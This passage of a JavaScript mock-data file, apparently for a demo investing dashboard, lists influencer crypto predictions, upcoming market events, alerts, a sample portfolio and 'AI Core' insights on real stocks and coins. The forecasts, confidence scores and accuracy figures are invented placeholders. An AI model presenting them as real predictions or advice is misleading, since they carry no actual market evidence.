        name: 'DeFi and L2 Analyst',
        handle: '@defi_l2',
        platform: 'Twitter',
        followerCount: 380000,
        credibilityScore: 0.79,
        recentPredictions: [
          {
            id: 'pred_5',
            asset: 'ETH',
            prediction: 'bullish',
            confidence: 0.85,
            timestamp: new Date(Date.now() - 9000000).toISOString(),
            targetPrice: 2800,
            timeframe: '90 days',
            description: 'Ethereum L2 activity and the EIP-4844 (blob storage) upgrade support a re-rating for ETH relative to BTC. Staking yield and burn mechanics create a structural bid and deflationary narrative. ETH/BTC could outperform if the L2 narrative strengthens and TVL continues to grow. Target $2,800 over 90 days with the protocol upgrade and potential ETF speculation as catalysts. Invalidation would be a breakdown in L2 adoption or a sharp macro risk-off move. Consider holding ETH alongside BTC for diversification within crypto.'
          }
        ],
        sentiment: 0.76
      }
    ],
    marketEvents: [
      {
        id: 'event_1',
        type: 'earnings_release',
        asset: 'NVDA',
        scheduledTime: new Date(Date.now() + 86400000 * 5).toISOString(),
        importance: 'critical',
        expectedImpact: 'positive',
        description: 'NVIDIA Q4 2024 Earnings Report. Street expects another beat on data center and automotive revenue. Key focus: Blackwell ramp timeline, China exposure, and full-year guidance. Options market implies a large move; historical post-earnings volatility suggests defined-risk strategies. AI Core has high confidence in upside surprise based on supply chain and demand indicators.',
        aiCorePrediction: {
          confidence: 0.94,
          predictedMove: 'upside',
          magnitude: 'high'
        }
      },
      {
        id: 'event_2',
        type: 'economic_indicator',
        asset: 'market_wide',
        scheduledTime: new Date(Date.now() + 86400000 * 3).toISOString(),
        importance: 'high',
        expectedImpact: 'neutral',
        description: 'US Non-Farm Payrolls Report. Consensus expects moderate job growth and stable unemployment. Wage growth and participation rate will be watched for inflation and labor market slack. A strong print could reinforce Fed patience on cuts; a weak print could bring forward rate-cut expectations. Equities and crypto have been sensitive to payroll surprises; consider reducing leverage ahead of the release.',
        aiCorePrediction: {
          confidence: 0.87,
          predictedMove: 'moderate',
          magnitude: 'medium'
        }
      },
      {
        id: 'event_3',
        type: 'product_launch',
        asset: 'AAPL',
        scheduledTime: new Date(Date.now() + 86400000 * 7).toISOString(),
        importance: 'high',
        expectedImpact: 'positive',
        description: 'Apple Vision Pro Public Launch. The spatial computing device enters broader retail availability. Early reviews and developer adoption will shape the narrative around the product cycle. Success could support services and ecosystem lock-in; disappointment could pressure multiple expansion. AI Core sees moderate upside catalyst potential with high uncertainty on unit trajectory.',
        aiCorePrediction: {
          confidence: 0.91,
          predictedMove: 'upside',
          magnitude: 'medium'
        }
      },
      {
        id: 'event_4',
        type: 'network_upgrade',
        asset: 'ETH',
        scheduledTime: new Date(Date.now() + 86400000 * 14).toISOString(),
        importance: 'high',
        expectedImpact: 'positive',
        description: 'Ethereum Protocol Upgrade - EIP-4844 (Proto-Danksharding). Blob storage will reduce L2 data availability costs materially and improve scalability narrative. Staking and burn mechanics continue to support deflationary thesis. Historical upgrades have been net positive for ETH price and L2 activity; execution risk is low given testnet success.',
        aiCorePrediction: {
          confidence: 0.89,
          predictedMove: 'upside',
          magnitude: 'high'
        }
      },
      {
        id: 'event_5',
        type: 'fomc_meeting',
        asset: 'market_wide',
        scheduledTime: new Date(Date.now() + 86400000 * 21).toISOString(),
        importance: 'critical',
        expectedImpact: 'neutral',
        description: 'Federal Open Market Committee (FOMC) Meeting and Press Conference. No rate change expected; focus on dot plot, balance sheet guidance, and Chair Powell\'s tone. Any shift in data dependency or forward guidance could move rates, dollar, and risk assets. AI Core assigns high probability of hold with dovish lean; tail risk of hawkish surprise if inflation reaccelerates.',
        aiCorePrediction: {
          confidence: 0.85,
          predictedMove: 'moderate',
          magnitude: 'high'
        }
      },
      {
        id: 'event_6',
        type: 'earnings_release',
        asset: 'META',
        scheduledTime: new Date(Date.now() + 86400000 * 10).toISOString(),
        importance: 'high',
        expectedImpact: 'positive',
        description: 'Meta Platforms Q4 2024 Earnings Report. Street expects strong ad revenue and Reels monetization. Reality Labs losses and capital allocation (buybacks, dividends) will be in focus. Regulatory and privacy headwinds in EU remain; US antitrust risk is a longer-term overhang. AI Core sees moderate upside potential with sentiment already constructive.',
        aiCorePrediction: {
          confidence: 0.88,
          predictedMove: 'upside',
          magnitude: 'medium'
        }
      }
    ],
    alerts: [
      {
        id: 'global_alert_1',
        type: 'market_volatility',
        severity: 'high',
        title: 'Market Volatility Spike Detected',
        message: 'VIX index surged 15% in the past session, indicating increased market uncertainty and demand for hedges. Put/call ratios and skew have moved in favor of protection. Historical regimes with similar VIX jumps have been followed by mean reversion in equities over a 5–10 day window, but macro catalysts (rates, geopolitics) could extend volatility. Consider reducing leverage and reviewing stop levels on high-beta names.',
        timestamp: new Date(Date.now() - 3600000).toISOString(),
        affectedAssets: ['AAPL', 'MSFT', 'GOOGL', 'TSLA'],
        actionRequired: true,
        aiCoreAccuracy: 0.94
      },
      {
        id: 'global_alert_2',
        type: 'correlation_breakdown',
        severity: 'medium',
        title: 'Stock-Crypto Correlation Breakdown',
        message: 'Traditional correlation between stocks and crypto has weakened significantly over the past two weeks. Historical beta relationships between major tech equities and Bitcoin have diverged, suggesting sector rotation or macro regime change. Monitor cross-asset exposure and consider rebalancing hedges.',
        timestamp: new Date(Date.now() - 7200000).toISOString(),
        affectedAssets: ['BTC', 'ETH', 'AAPL', 'TSLA'],
        actionRequired: false,
        aiCoreAccuracy: 0.91
      },
      {
        id: 'global_alert_3',
        type: 'liquidity_event',
        severity: 'critical',
        title: 'Low Liquidity Warning',
        message: 'Trading volume across selected assets is below the 30-day average by approximately 40%, which historically has preceded wider bid-ask spreads and potential for increased intraday volatility. Market makers may reduce size in thin conditions. Consider sizing orders and using limit orders; avoid large market orders in illiquid names. Liquidity typically improves after major economic releases and into the US session.',
        timestamp: new Date(Date.now() - 10800000).toISOString(),
        affectedAssets: ['SOL'],
        actionRequired: true,
        aiCoreAccuracy: 0.96
      },
      {
        id: 'global_alert_4',
        type: 'sector_rotation',
        severity: 'medium',
        title: 'Sector Rotation: Money Flow into Value and Financials',
        message: 'Cross-asset flow data indicates rotation out of growth and momentum into value and financials over the past week. Banks and energy have seen relative strength while long-duration tech and crypto have lagged. This may reflect rate expectations, profit-taking, or rebalancing. AI Core assigns 87% confidence that the move is tactical rather than structural; monitor for persistence before adjusting strategic allocation.',
        timestamp: new Date(Date.now() - 4500000).toISOString(),
        affectedAssets: ['JPM', 'AAPL', 'NVDA', 'BTC'],
        actionRequired: false,
        aiCoreAccuracy: 0.87
      },
      {
        id: 'global_alert_5',
        type: 'macro_regime',
        severity: 'high',
        title: 'Macro Regime: Real Yields and Dollar Strength',
        message: 'Real Treasury yields have risen and the dollar has strengthened on the back of resilient US data and Fed rhetoric. Historically, such regimes have pressured risk assets, especially long-duration growth and crypto. Gold and commodity-linked names have held up. AI Core suggests maintaining a modest defensive tilt until either inflation softens or growth meaningfully decelerates. Rebalancing from growth into value and adding hedges is consistent with current signals.',
        timestamp: new Date(Date.now() - 8100000).toISOString(),
        affectedAssets: ['BTC', 'ETH', 'AAPL', 'MSFT', 'GOOGL', 'NVDA'],
        actionRequired: true,
        aiCoreAccuracy: 0.91
      }
    ],
    portfolio: {
      userId: 'user_demo_123',
      totalValue: 125000.50,
      totalChange: 3250.75,
      totalChangePercent: 2.67,
      description: 'Diversified portfolio across crypto (BTC, ETH), tech equities (NVDA, AAPL), and growth names. Allocation is tilted toward long-duration assets with exposure to AI, cloud, and digital assets. Rebalancing and risk management are recommended ahead of major macro events (FOMC, payrolls, CPI). Consider adding hedges or reducing leverage if volatility spikes.',
      assets: [
        {
          assetId: 'BTC',
          quantity: 1.5,
          avgBuyPrice: 41000,
          currentPrice: 43250.50,
          value: 64875.75,
          change: 3375.75,
          changePercent: 5.48,
          description: 'Core crypto allocation. Held for long-term appreciation and portfolio diversification. ETF flows and macro (rates, dollar) are supportive; consider rebalancing if allocation exceeds target or on extended rallies.'
        },
        {
          assetId: 'NVDA',
          quantity: 50,
          avgBuyPrice: 450,
          currentPrice: 485.20,
          value: 24260,
          change: 1760,
          changePercent: 7.82,
          description: 'Primary AI and semiconductor exposure. Earnings and Blackwell ramp are key catalysts. Position size is meaningful; consider trimming into strength or adding on pullbacks with defined risk. Monitor options flow and insider activity.'
        },
        {
          assetId: 'AAPL',
          quantity: 100,
          avgBuyPrice: 170,
          currentPrice: 178.45,
          value: 17845,
          change: 845,
          changePercent: 4.97,
          description: 'Quality growth and services exposure. Regulatory overhang in EU is a monitorable risk; product cycle (iPhone, Vision Pro) could provide catalyst. Dividend and buybacks support total return. Suitable for core holding with periodic rebalancing.'
        },
        {
          assetId: 'ETH',
          quantity: 10,
          avgBuyPrice: 2600,
          currentPrice: 2650.75,
          value: 26507.5,
          change: 507.5,
          changePercent: 1.95,
          description: 'Ethereum allocation for L2 and DeFi exposure. Staking yield and burn support deflationary thesis. Protocol upgrades and ETF speculation are catalysts. Consider holding alongside BTC for diversification within crypto.'
        },
        {
          assetId: 'META',
          quantity: 25,
          avgBuyPrice: 485,
          currentPrice: 512.40,
          value: 12810,
          change: 685,
          changePercent: 5.65,
          description: 'Advertising and AI product exposure. Reels monetization and capital return (buybacks, dividends) are key drivers. Reality Labs is a long-dated bet. Regulatory and privacy headwinds persist but core business remains resilient.'
        }
      ],
      watchlist: ['TSLA', 'MSFT', 'GOOGL', 'SOL', 'AMZN', 'JPM', 'XRP', 'AVAX']
    },
    aiCoreInsights: [
      {
        id: 'insight_1',
        type: 'pattern_recognition',
        asset: 'BTC',
        confidence: 0.94,
        title: 'Bullish Flag Pattern Identified',
        description: 'AI Core has identified a classic bullish flag pattern on the daily chart with 94% historical accuracy in similar regimes. Volume has contracted during the consolidation, which is typical of healthy flags. The measured move target from the pole implies a move toward $45,500–46,000 if resistance at $44,000 is cleared. Invalidation would be a close below the recent swing low. Risk/reward favors a defined-risk long for trend followers; consider trailing stops if the breakout confirms.',
        timestamp: new Date(Date.now() - 5400000).toISOString(),
        actionable: true
      },
      {
        id: 'insight_2',
        type: 'anomaly_detection',
        asset: 'NVDA',
        confidence: 0.92,
        title: 'Unusual Options Activity Detected',
        description: 'Significant call option buying has been detected across multiple expiries, with open interest and volume skewed toward upside strikes. The activity is concentrated in institutional-sized blocks and is consistent with either hedging of short exposure or directional bullish positioning ahead of earnings. Put/call ratio has dropped and skew has flattened. AI Core assigns 92% confidence that this reflects informed flow rather than retail speculation. Historical precedents suggest elevated volatility around the event; consider defined-risk strategies or reducing size into the print.',
        timestamp: new Date(Date.now() - 7200000).toISOString(),
        actionable: true
      },
      {
        id: 'insight_3',
        type: 'sentiment_analysis',
        asset: 'market_wide',
        confidence: 0.89,
        title: 'Market Sentiment Shift Detected',
        description: 'Overall market sentiment has shifted from neutral to moderately bullish over the past 24 hours, as measured by news flow, social sentiment, and options positioning. The change is broad-based across equities and crypto but most pronounced in tech and growth. Contrarian indicators are not yet at extremes, so the move may have room to run. AI Core suggests using pullbacks to add exposure in high-conviction names rather than chasing strength. Monitor for divergence between price and sentiment as an early warning of exhaustion.',
        timestamp: new Date(Date.now() - 3600000).toISOString(),
        actionable: false
      },
      {
        id: 'insight_4',
        type: 'correlation_breakdown',
        asset: 'ETH',
        confidence: 0.88,
        title: 'Ethereum-Bitcoin Correlation Regime Change',
        description: 'The rolling 30-day correlation between Ethereum and Bitcoin has declined from historical highs, suggesting ETH is trading on its own catalysts (L2 activity, staking, protocol upgrades) rather than purely as a beta play on BTC. This has implications for portfolio construction: ETH may offer diversification within crypto and could outperform or underperform BTC in different macro regimes. AI Core recommends reviewing ETH/BTC allocation and considering separate entries for each based on respective fundamentals and technicals.',
        timestamp: new Date(Date.now() - 9000000).toISOString(),
        actionable: true
      },
      {
        id: 'insight_5',
        type: 'earnings_quality',
        asset: 'AAPL',
        confidence: 0.86,
        title: 'Apple Services Revenue Quality and Margin Expansion',
        description: 'AI Core has flagged Apple\'s services segment as a key driver of margin expansion and recurring revenue quality. Geographic mix and regulatory overhang in the EU are offset by installed base growth and attach rates. The upcoming product cycle (iPhone, Vision Pro) could provide a catalyst for hardware revenue reacceleration. Sentiment is mixed on valuation; the stock often consolidates post-earnings before the next leg. Consider layering into positions on weakness with a 6–12 month horizon.',
        timestamp: new Date(Date.now() - 12600000).toISOString(),
        actionable: false
      },
      {
        id: 'insight_6',
        type: 'liquidity_forecast',
        asset: 'market_wide',
        confidence: 0.91,
        title: 'Liquidity and Volatility Forecast for the Week Ahead',
        description: 'Upcoming economic releases (non-farm payrolls, CPI, FOMC) are likely to drive elevated volatility and volume. AI Core forecasts a 30% increase in realized volatility versus the prior week, with the highest impact around the payroll and CPI prints. Crypto and growth equities are expected to be most sensitive. Consider reducing leverage ahead of events, using options for defined risk, or waiting for clarity before adding size. Liquidity typically improves after the first hour of the US session post-release.',
        timestamp: new Date(Date.now() - 5400000).toISOString(),
        actionable: true
      }
    ]
  };
};

module.exports = generateMarketData();
